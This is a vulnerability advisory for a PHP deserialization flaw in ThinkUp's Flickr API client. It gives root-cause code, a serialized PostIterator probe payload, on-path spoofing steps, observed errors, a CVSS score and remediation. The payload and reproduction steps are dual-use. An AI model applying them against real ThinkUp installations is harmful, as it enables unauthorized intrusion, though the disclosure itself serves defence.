# ThinkUp PHP Object Injection (Deserialization of Untrusted Data)

**CWE-502 · Unauthenticated (on-path network attacker) deserialization · Attacker-chosen object instantiation + destructor POP entry in the ThinkUp crawler**

> **Vendor:** ThinkUpLLC (https://github.com/ThinkUpLLC)
> **Product:** ThinkUp (standalone PHP web application, https://github.com/ThinkUpLLC/ThinkUp)
> **Affected version:** master branch, commit ac41d11 (2016-06-16), latest as of 2026-09-27; project discontinued, no fixed release
> **Affected endpoints:** `webapp/plugins/expandurls/model/class.FlickrAPIAccessor.php:60` (no direct HTTP endpoint; internal trigger chain via `webapp/plugins/expandurls/model/class.ExpandURLsPlugin.php:271` inside every crawler crawl run)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Validation used only a harmless object-injection probe payload; no data was extracted and no sensitive values appear in this disclosure.

## 1. Summary

The expandurls plugin's Flickr client fetches photo metadata from `http://api.flickr.com` (plaintext HTTP, `$api_url` at line 29) and feeds the raw response body to `unserialize()` at `webapp/plugins/expandurls/model/class.FlickrAPIAccessor.php:60`. Any on-path network attacker (ARP/DNS spoofing, rogue DHCP, compromised router, hosts-file manipulation) controls every response byte and can instantiate attacker-chosen PHP classes inside the ThinkUp crawler process, reaching a destructor-controlled method invocation (`PostIterator::__destruct`). Only **object injection plus a POP entry point** is demonstrated — no complete RCE gadget chain was found or claimed.

## 2. Root Cause

| File | Line | Role |
|---|---|---|
| `webapp/plugins/expandurls/model/class.FlickrAPIAccessor.php` | 29 | `$api_url = "http://api.flickr.com/services/rest/?"` — plaintext HTTP endpoint |
| `webapp/plugins/expandurls/model/class.FlickrAPIAccessor.php` | 43-53 | `photo_id` derived from the post's `http://flic.kr/p/<id>` link; request URL assembled |
| `webapp/plugins/expandurls/model/class.FlickrAPIAccessor.php` | 58 | `$resp = Utils::getURLContents($api_call);` — raw network fetch, no TLS |
| `webapp/plugins/expandurls/model/class.FlickrAPIAccessor.php` | 60 | `$fphoto = unserialize($resp);` — **unserialize of unvalidated network data** |
| `webapp/_lib/model/class.PostIterator.php` | 124-127 | `__destruct()` invokes `$this->stmt->closeCursor()` — POP entry (destructor method call on attacker-chosen object) |
| `webapp/plugins/expandurls/model/class.ExpandURLsPlugin.php` | 271 | `getFlickrPhotoSource($flickr_link)` — crawler-side trigger |

```php
// webapp/plugins/expandurls/model/class.FlickrAPIAccessor.php:29,58-60
var $api_url = "http://api.flickr.com/services/rest/?";   // line 29 - plain http
...
$resp = Utils::getURLContents($api_call);                  // line 58 - attacker-readable position
if ($resp != false) {
    $fphoto = unserialize($resp);                          // line 60 - CWE-502 sink
```

## 3. Prerequisites

- The **expandurls plugin is enabled** by the administrator **and a Flickr API key is configured** (`getFlickrPhotoSource()` early-returns otherwise).
- The crawler processes a post whose text contains an `http://flic.kr/p/<short_id>` link (links come from `tu_links` via `getLinksToExpand()`).
- The attacker holds an **on-path network position** between the ThinkUp server and `api.flickr.com` (AV:A/AC:H — the request uses plaintext `http://`).
- No application authentication is involved at the sink itself.

## 4. Reproduction

1) Simulate the on-path attacker: pin `api.flickr.com` to the attacker host (hosts file / DNS spoof / ARP spoof) and answer plaintext HTTP on port 80.

2) Serve the harmless probe payload (69 bytes, `poc/payload-attacker.bin`) for `GET /services/rest/...`:

```
O:12:"PostIterator":1:{s:18:"\0PostIterator\0stmt";O:8:"stdClass":0:{}}
```

3) Trigger from the application side: the crawler fetches (observed verbatim in the fetch log):

```http
GET http://api.flickr.com/services/rest/?method=flickr.photos.getSizes&photo_id=51236135968&api_key=<flickr key>&format=php_serial
```

4) Observed result:

```
PHP Fatal error:  Uncaught Error: Cannot use object of type PostIterator as array
    in .../webapp/plugins/expandurls/model/class.FlickrAPIAccessor.php:62

Next Error: Call to undefined method stdClass::closeCursor()
    in .../webapp/_lib/model/class.PostIterator.php:127
#0 ... PostIterator->__destruct()
```

Scripted PoC: `poc/harness.php` + `poc/serve_payload.py` + `poc/payload-attacker.bin` / `poc/payload-benign.bin` (target source: `poc/TARGET-SOURCE.txt`).

## 5. Confirmed Techniques

Dynamically verified against the **unmodified** target file (sha256 `2cc4bab3...a1ebe`, commit `ac41d11`) under PHP 7.4.33 — only `Logger` was stubbed (log sink), no ThinkUp source was modified:

- **RUN 1 (attacker response):** hosts pin `api.flickr.com -> 127.0.0.1`, local server returned the 69-byte probe. Marker 1: fatal `Cannot use object of type PostIterator as array` at line 62 (object injection). Marker 2: `Call to undefined method stdClass::closeCursor()` raised from `PostIterator->__destruct()` (line 124, sink line 127) at shutdown (POP entry). The probe is harmless — no file writes, no command execution, exit 255 only.
- **RUN 2 (control, benign response):** a well-formed Flickr `php_serial` reply completed cleanly (exit 0, destructor branch not taken) — proving the fatal is specific to attacker-controlled bytes.
- **Trigger-chain reachability** verified at source level: crawler crawl run -> `ExpandURLsPlugin::expandOriginalURLs()` -> `http://flic.kr/` prefix match -> `expandFlickrThumbnail()` (line 268) -> `getFlickrPhotoSource()` (line 271) -> `unserialize()` (line 60, dynamically confirmed).
- Raw transcript: `evidence/TU-01.txt`.

## 6. Impact

A network-positioned attacker can inject arbitrary serialized objects into the ThinkUp crawler process: attacker-chosen class instantiation with controlled properties plus a destructor method-call entry point — a code-execution stepping stone that depends on available gadget chains, and in any case a primitive for manipulating the crawler's internal state. **Honest boundary: only object injection + the POP entry are demonstrated; no full RCE chain was found, and none is claimed.** The CVSS impact is scored conservatively on the demonstrated primitive.

## 7. CVSS 3.1

`CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L` (Base 5.0 — Medium)

## 8. Remediation

1. Switch `$api_url` to `https://` so the API response cannot be rewritten on the network path.
2. Request a non-serialized format (`format=xml` / `json`) and parse it with a dedicated decoder instead of `unserialize()`.
3. If a serialized format must remain, validate the decoded structure strictly (e.g. expected array with `stat` key) — never `unserialize()` remote content.
4. Add a regression test asserting that a tampered API response cannot instantiate application classes.

## 9. References

- Project: https://github.com/ThinkUpLLC/ThinkUp
- CWE-502 (Deserialization of Untrusted Data): https://cwe.mitre.org/data/definitions/502.html
- External disclosure: [GIST_URL]
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
